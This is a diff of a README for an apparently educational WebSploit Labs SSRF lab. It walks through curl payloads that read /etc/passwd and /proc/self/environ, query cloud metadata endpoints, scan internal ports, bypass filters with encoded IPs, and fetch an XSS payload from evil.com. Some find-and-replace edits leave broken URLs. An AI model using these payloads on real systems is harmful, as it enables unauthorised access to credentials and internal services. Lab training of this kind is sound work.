@@ -1,4 +1,10 @@
 # SSRF Forge: A WebSploit Labs Internal Threat Simulation
+
+**Lab Name:** `trojan-relay`
+**Vulnerability:** Server-Side Request Forgery (SSRF)
+
+This lab is part of the WebSploit Labs framework and it is running on the `trojan-relay` container on the `10.6.6.32` IP address.
+Access the lab at `http://10.6.6.32:5012`.
 *Created by Omar Santos for [WebSploit Labs](https://websploit.org/) - Cybersecurity Education*
 
 [WebSploit Labs](https://websploit.org/) is a learning environment created by Omar Santos for different Cybersecurity Ethical Hacking, Bug Hunting, Incident Response, Digital Forensics, and Threat Hunting training sessions. WebSploit Labs includes several intentionally vulnerable applications running in Docker containers on top of Kali Linux or Parrot Security OS, several additional tools, and over 9,000 cybersecurity resources.
@@ -20,21 +26,10 @@ By completing this lab, students will learn to:
 - Burp Suite or similar proxy tool (optional)
 - Access to the SSRF vulnerable application
 
-## 🚀 Lab Setup
+## How to Run
+This lab is part of the WebSploit Labs framework and it is running on the `trojan-relay` container on the `10.6.6.32` IP address.
+Access the lab at `http://10.6.6.32:5012`.
 
-### Install Dependencies
-```bash
-pip install -r requirements.txt
-```
-
-### Running the Application
-```bash
-# There is a ssrf_app.py file in the SSRF directory
-# Run it with:
-python3 ssrf_app.py
-```
-
-### Docker Setup (Recommended)
 
 There is a Dockerfile in the SSRF directory. However, the following example is provided for your convenience:
 
@@ -86,7 +81,7 @@ Before testing for SSRF, understand normal behavior:
 
 ```bash
 # Test with legitimate external URL
-curl -X POST http://localhost:5012/fetch -d "url=https://httpbin.org/get"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=https://httpbin.org/get"
 ```
 
 ### Phase 2: Basic SSRF Testing
@@ -96,13 +91,13 @@ Test if you can access internal services:
 
 ```bash
 # Test localhost access
-curl -X POST http://localhost:5012/fetch -d "url=http://localhost:5012/health"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://10.6.6.32:5012/health"
 
 # Test different localhost variations
-- http://127.0.0.1:5012
+- http://10.6.6.32:5012
 - http://0.0.0.0:5012
 - http://[::1]:5012
-- http://localhost.localdomain:5012
+- http://10.6.6.35.localdomain:5012
 ```
 
 #### 2.2 Port Scanning
@@ -110,10 +105,10 @@ Use SSRF to scan internal ports:
 
 ```bash
 # Common internal services
-curl -X POST http://localhost:5012/fetch -d "url=http://127.0.0.1:22"    # SSH
-curl -X POST http://localhost:5012/fetch -d "url=http://127.0.0.1:3306"  # MySQL
-curl -X POST http://localhost:5012/fetch -d "url=http://127.0.0.1:6379"  # Redis
-curl -X POST http://localhost:5012/fetch -d "url=http://127.0.0.1:27017" # MongoDB
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://10.6.6.35:22"    # SSH
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://10.6.6.35:3306"  # MySQL
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://10.6.6.35:6379"  # Redis
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://10.6.6.35:27017" # MongoDB
 ```
 
 #### 2.3 Protocol Testing
@@ -121,13 +116,13 @@ Test different protocols:
 
 ```bash
 # File protocol (if supported)
-curl -X POST http://localhost:5012/fetch -d "url=file:///etc/passwd"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=file:///etc/passwd"
 
 # FTP protocol
-curl -X POST http://localhost:5012/fetch -d "url=ftp://internal-ftp-server/"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=ftp://internal-ftp-server/"
 
 # LDAP protocol
-curl -X POST http://localhost:5012/fetch -d "url=ldap://internal-ldap/"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=ldap://internal-ldap/"
 ```
 
 ### Phase 3: Advanced SSRF Exploitation
@@ -137,13 +132,13 @@ If running in cloud environments:
 
 ```bash
 # AWS EC2 metadata
-curl -X POST http://localhost:5012/fetch -d "url=http://169.254.169.254/latest/meta-data/"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://169.254.169.254/latest/meta-data/"
 
 # Google Cloud metadata
-curl -X POST http://localhost:5012/fetch -d "url=http://metadata.google.internal/computeMetadata/v1/"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://metadata.google.internal/computeMetadata/v1/"
 
 # Azure metadata
-curl -X POST http://localhost:5012/fetch -d "url=http://169.254.169.254/metadata/instance?api-version=2029-02-01"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://169.254.169.254/metadata/instance?api-version=2029-02-01"
 ```
 
 #### 3.2 Bypass Techniques
@@ -151,26 +146,26 @@ curl -X POST http://localhost:5012/fetch -d "url=http://169.254.169.254/metadata
 **URL Encoding:**
 ```bash
 # Double URL encoding
-curl -X POST http://localhost:5012/fetch -d "url=http%253A%252F%252F127.0.0.1%253A22"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http%253A%252F%252F127.0.0.1%253A22"
 ```
 
 **Alternative IP Representations:**
 ```bash
 # Decimal representation of 127.0.0.1
-curl -X POST http://localhost:5012/fetch -d "url=http://2130706433:5012"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://2130706433:5012"
 
 # Hexadecimal representation
-curl -X POST http://localhost:5012/fetch -d "url=http://0x7f000001:5012"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://0x7f000001:5012"
 
 # Mixed representations
-curl -X POST http://localhost:5012/fetch -d "url=http://127.1:5012"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://127.1:5012"
 ```
 
 **DNS-based bypasses:**
 ```bash
 # Using DNS that resolves to localhost
-curl -X POST http://localhost:5012/fetch -d "url=http://localtest.me:5012"
-curl -X POST http://localhost:5012/fetch -d "url=http://lvh.me:5012"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://localtest.me:5012"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://lvh.me:5012"
 ```
 
 #### 3.3 Webhook Exploitation
@@ -178,13 +173,13 @@ Test the webhook functionality:
 
 ```bash
 # Use webhook.site for testing
-curl -X POST http://localhost:5012/webhook \
+curl -X POST http://10.6.6.32:5012/webhook \
   -d "webhook_url=https://webhook.site/your-unique-id" \
   -d "data=SSRF test payload"
 
 # Test internal webhook
-curl -X POST http://localhost:5012/webhook \
-  -d "webhook_url=http://127.0.0.1:5012/health" \
+curl -X POST http://10.6.6.32:5012/webhook \
+  -d "webhook_url=http://10.6.6.32:5012/health" \
   -d "data=internal request"
 ```
 
@@ -203,10 +198,10 @@ Combine SSRF with other vulnerabilities:
 
 ```bash
 # Test for reflected content (potential XSS)
-curl -X POST http://localhost:5012/analyze -d "target_url=http://evil.com/xss-payload"
+curl -X POST http://10.6.6.32:5012/analyze -d "target_url=http://evil.com/xss-payload"
 
 # Test for SSRF + Local File Inclusion
-curl -X POST http://localhost:5012/fetch -d "url=file:///proc/self/environ"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=file:///proc/self/environ"
 ```
 
 ## 🔧 Testing with Burp Suite
@@ -227,7 +222,7 @@ Use Burp's SSRF detection extensions:
 ### Test Case 1: Basic Internal Access
 ```bash
 # Objective: Access the application's own health endpoint
-curl -X POST http://localhost:5012/fetch -d "url=http://localhost:5012/health"
+curl -X POST http://10.6.6.32:5012/fetch -d "url=http://10.6.6.32:5012/health"
 
 # Expected: Should return health check information
 # Impact: Confirms SSRF vulnerability exists
@@ -238,7 +233,7 @@ curl -X POST http://localhost:5012/fetch -d "url=http://localhost:5012/health"
 # Objective: Discover internal services
 for port in 22 80 443 3306 5432 6379 8080; do
   echo "Testing port $port:"
-  curl -s -X POST http://localhost:5012/validate -d "link=http://127.0.0.1:$port" | grep -E "(accessible|Status Code)"
+  curl -s -X POST http://10.6.6.32:5012/validate -d "link=http://10.6.6.35:$port" | grep -E "(accessible|Status Code)"
 done
 ```
 
